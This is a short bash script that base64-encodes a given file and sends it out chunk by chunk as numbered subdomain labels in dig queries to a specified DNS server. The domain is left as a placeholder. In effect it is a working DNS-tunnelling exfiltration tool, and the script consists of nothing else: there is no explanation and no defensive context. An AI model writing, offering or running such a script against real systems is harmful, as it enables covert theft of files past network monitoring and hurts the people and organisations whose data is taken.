#!/bin/bash
file=$1
server=$2
n=0
base64 -w 52 $file| while read line; do
  line=$(echo $line |tr -d '\n')
  req=$(echo "${n}.$line")
  #echo $req
  dig @$server "${n}.${line}.<domain>.<name>"
  n=$((n+1))
done 
